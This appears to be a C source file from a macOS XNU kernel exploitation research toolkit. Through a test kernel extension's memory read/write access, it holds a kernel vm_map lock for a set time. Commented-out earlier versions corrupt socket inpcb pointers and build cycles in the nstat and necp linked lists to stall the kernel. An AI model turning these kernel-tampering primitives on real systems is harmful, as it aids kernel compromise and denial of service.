//
//  main.c
//  locker
//
//  Created by admin on 11/25/21.
//

#include <assert.h>
#include <limits.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>

#include <sys/socket.h>
#include <sys/sysctl.h>
#include <sys/errno.h>
#include <gym_client.h>

#include <arpa/inet.h>

#include <dispatch/dispatch.h>

#include "kmem.h"
#include "kmem_gym.h"
#include "slider.h"
#include "platform_types.h"
#include "platform_variables.h"
#include "allocator_msdosfs.h"

#include "xnu_proc.h"
#include "util_lck_rw.h"


//int main(int argc, const char * argv[]) {
//    if (argc != 2) {
//        printf("[ERROR] invalid arguments\n");
//        abort();
//    }
//
//    char* endp;
//    long duration = strtol(argv[1], &endp, 0);
//    if (*endp != '\0' || duration > INT_MAX) {
//        printf("[ERROR] invalid lock duration %s\n", argv[1]);
//        abort();
//    }
//
//    xe_kmem_use_backend(xe_kmem_gym_create());
//    xe_slider_init();
//    xe_allocator_msdosfs_loadkext();
//
//    uintptr_t kheap_default = xe_slider_slide(VAR_KHEAP_DEFAULT);
//    uintptr_t kh_large_map = xe_kmem_read_uint64(KMEM_OFFSET(kheap_default, TYPE_KALLOC_HEAP_MEM_KH_LARGE_MAP_OFFSET));
//    uintptr_t lck_rw = KMEM_OFFSET(kh_large_map, TYPE_VM_MAP_MEM_LCK_RW_OFFSET);
//
//    printf("[INFO] locking vm_map_t %p\n", (void*)kh_large_map);
//    getpass("press enter to continue...\n");
//    struct gym_lck_rw_hold_release_cmd cmd;
//    cmd.lck_rw = lck_rw;
//    cmd.seconds = (int)duration;
//    cmd.exclusive = 0;
//
//    if (sysctlbyname("kern.gym_lck_rw_hold_release", NULL, NULL, &cmd, sizeof(cmd))) {
//        printf("[ERROR] gym lock failed, err: %d\n", errno);
//        abort();
//    }
//    printf("[INFO] lock released\n");
//    return 0;
//}


//int main(int argc, const char* argv[]) {
//    xe_kmem_use_backend(xe_kmem_gym_create());
//    xe_slider_init();
//
//    uintptr_t kernproc = xe_kmem_read_uint64(xe_slider_slide(VAR_KERNPROC_ADDR));
//    uintptr_t proc;
//    int error = xe_xnu_proc_current_proc(kernproc, &proc);
//    assert(error == 0);
//
//    uintptr_t kheap_default = xe_slider_slide(VAR_KHEAP_DEFAULT_ADDR);
//    uintptr_t kh_large_map = xe_kmem_read_uint64(KMEM_OFFSET(kheap_default, TYPE_KALLOC_HEAP_MEM_KH_LARGE_MAP_OFFSET));
//    uintptr_t lck_rw = KMEM_OFFSET(kh_large_map, TYPE_VM_MAP_MEM_LCK_RW_OFFSET);
//    printf("[INFO] attempt locking %p\n", (void*)lck_rw);
//
//    struct sockaddr_in6 src_addr;
//    bzero(&src_addr, sizeof(src_addr));
//    src_addr.sin6_addr = in6addr_loopback;
//    src_addr.sin6_port = 9091;
//    src_addr.sin6_family = AF_INET6;
//    src_addr.sin6_len = sizeof(src_addr);
//
//    int sock1 = socket(PF_INET6, SOCK_DGRAM, 0);
//    assert(sock1 >= 0);
//
//    sa_endpoints_t epts;
//    bzero(&epts, sizeof(epts));
//    epts.sae_dstaddr = (struct sockaddr*)&src_addr;
//    epts.sae_dstaddrlen = sizeof(src_addr);
//
//    int res = connectx(sock1, &epts, SAE_ASSOCID_ANY, 0, NULL, 0, NULL, NULL);
//    assert(res == 0);
//
//    uintptr_t sock1_addr;
//    error = xe_xnu_proc_find_fd_data(proc, sock1, &sock1_addr);
//    assert(error == 0);
//
//    // make inp->inp_pcbinfo = map->lck_mtx_addr - 0x38
//    uintptr_t inpcb = xe_kmem_read_uint64(KMEM_OFFSET(sock1_addr, TYPE_SOCKET_MEM_SO_PCB_OFFSET));
//    struct in6_addr in6_addr;
//    memset(&in6_addr, 0xab, sizeof(in6_addr));
//    xe_kmem_write(KMEM_OFFSET(inpcb, TYPE_INPCB_MEM_INP_DEPENDLADDR_OFFSET), &in6_addr, sizeof(in6_addr));
//
//    uintptr_t inp_pcbinfo = xe_kmem_read_uint64(KMEM_OFFSET(inpcb, TYPE_INPCB_MEM_INP_PCBINFO_OFFSET));
//    uintptr_t new_inp_pcbinfo = lck_rw - TYPE_INPCBINFO_MEM_IPI_LOCK_OFFSET;
//    xe_kmem_write_uint64(KMEM_OFFSET(inpcb, TYPE_INPCB_MEM_INP_PCBINFO_OFFSET), new_inp_pcbinfo);
//
//    // make nstat infinine
//    uintptr_t nstat_controls = xe_kmem_read_uint64(xe_slider_slide(VAR_NSTAT_CONTROLS_ADDR));
//    uintptr_t nstat_controls_head = nstat_controls;
//    uintptr_t nstat_controls_tail = nstat_controls;
//    while (TRUE) {
//        uintptr_t next = xe_kmem_read_uint64(KMEM_OFFSET(nstat_controls_tail, TYPE_NSTAT_CONTROL_STATE_MEM_NCS_NEXT_OFFSET));
//        if (next == 0) {
//            break;
//        } else {
//            nstat_controls_tail = next;
//        }
//    }
//    xe_kmem_write_uint64(KMEM_OFFSET(nstat_controls_tail, TYPE_NSTAT_CONTROL_STATE_MEM_NCS_NEXT_OFFSET), nstat_controls_head);
//
//    dispatch_queue_t queue = dispatch_queue_create("xe_queue", DISPATCH_QUEUE_CONCURRENT);
//
//    // trigger disconnect
//    dispatch_async(queue, ^() {
//        printf("[INFO] disconnect start\n");
//        int err = disconnectx(sock1, SAE_CONNID_ANY, SAE_ASSOCID_ANY);
//        assert(err == 0);
//        printf("[INFO] disconnect done\n");
//    });
//
//    // exit using inp check (cookie)
//    printf("[INFO] sleep start\n");
//    sleep(5);
//
//    uintptr_t necp_uuid_id_mapping_head = xe_kmem_read_uint64(xe_slider_slide(VAR_NECP_UUID_ID_MAPPING_HEAD_ADDR));
//    uintptr_t necp_uuid_id_mapping_tail = necp_uuid_id_mapping_head;
//    while (TRUE) {
//        uint32_t id = xe_kmem_read_uint32(KMEM_OFFSET(necp_uuid_id_mapping_tail, TYPE_NECP_UUID_ID_MAPPING_MEM_ID_OFFSET));
//
//        xe_kmem_write_uint32(KMEM_OFFSET(necp_uuid_id_mapping_tail, TYPE_NECP_UUID_ID_MAPPING_MEM_ID_OFFSET), id + 0xf);
//        uintptr_t next = xe_kmem_read_uint64(KMEM_OFFSET(necp_uuid_id_mapping_tail, TYPE_NECP_UUID_ID_MAPPING_MEM_CHAIN_OFFSET));
//        if (next == 0) {
//            break;
//        } else {
//            necp_uuid_id_mapping_tail = next;
//        }
//    }
//    assert(necp_uuid_id_mapping_tail != necp_uuid_id_mapping_head);
//
//    printf("[INFO] cycle head: %p\n, tail: %p\n", (void*)necp_uuid_id_mapping_head, (void*)necp_uuid_id_mapping_tail);
//
//    printf("[INFO] creating necp_uuid_id cycle\n");
//    xe_kmem_write_uint64(KMEM_OFFSET(necp_uuid_id_mapping_tail, TYPE_NECP_UUID_ID_MAPPING_MEM_CHAIN_OFFSET), necp_uuid_id_mapping_head);
//    xe_kmem_write_uint64(KMEM_OFFSET(inpcb, TYPE_INPCB_MEM_INP_PCBINFO_OFFSET), inp_pcbinfo);
//    xe_kmem_write_uint64(KMEM_OFFSET(nstat_controls_tail, TYPE_NSTAT_CONTROL_STATE_MEM_NCS_NEXT_OFFSET), 0);
//    printf("[INFO] linked list cycle broken\n");
//
//    sleep(2);
//
//    xe_kmem_write_uint64(KMEM_OFFSET(inpcb, TYPE_INPCB_MEM_INP_PCBINFO_OFFSET), new_inp_pcbinfo);
//    printf("[INFO] breaking necp_uuid_id cycle\n");
//    xe_kmem_write_uint64(KMEM_OFFSET(necp_uuid_id_mapping_tail, TYPE_NECP_UUID_ID_MAPPING_MEM_CHAIN_OFFSET), 0);
//    uintptr_t cursor = necp_uuid_id_mapping_head;
//    while (cursor != 0) {
//        uint32_t id = xe_kmem_read_uint32(KMEM_OFFSET(cursor, TYPE_NECP_UUID_ID_MAPPING_MEM_ID_OFFSET));
//        xe_kmem_write_uint32(KMEM_OFFSET(cursor, TYPE_NECP_UUID_ID_MAPPING_MEM_ID_OFFSET), id - 0xf);
//        cursor = xe_kmem_read_uint64(KMEM_OFFSET(necp_uuid_id_mapping_tail, TYPE_NECP_UUID_ID_MAPPING_MEM_CHAIN_OFFSET));
//    }
//    printf("[INFO] broke necp_uuid_id cycle\n");
//
//    sleep(2);
//
//    xe_kmem_write_uint64(KMEM_OFFSET(inpcb, TYPE_INPCB_MEM_INP_PCBINFO_OFFSET), inp_pcbinfo);
//
//    getpass("press enter to quit...\n");
//
//    return 0;
//}


int main(void) {
    xe_kmem_use_backend(xe_kmem_gym_create());
    xe_slider_init();
    
    uintptr_t kernproc = xe_kmem_read_uint64(xe_slider_slide(VAR_KERNPROC_ADDR));
    uintptr_t proc;
    int error = xe_xnu_proc_current_proc(kernproc, &proc);
    assert(error == 0);

    uintptr_t kheap_default = xe_slider_slide(VAR_KHEAP_DEFAULT_ADDR);
    uintptr_t kh_large_map = xe_kmem_read_uint64(KMEM_OFFSET(kheap_default, TYPE_KALLOC_HEAP_MEM_KH_LARGE_MAP_OFFSET));
    uintptr_t lck_rw = KMEM_OFFSET(kh_large_map, TYPE_VM_MAP_MEM_LCK_RW_OFFSET);
    printf("[INFO] attempt locking %p\n", (void*)lck_rw);
    
    xe_util_lck_rw_t util_lock = xe_util_lck_rw_lock_exclusive(proc, lck_rw);
    sleep(10);
    xe_util_lck_rw_lock_done(&util_lock);
    printf("done\n");
    
    return 0;
}
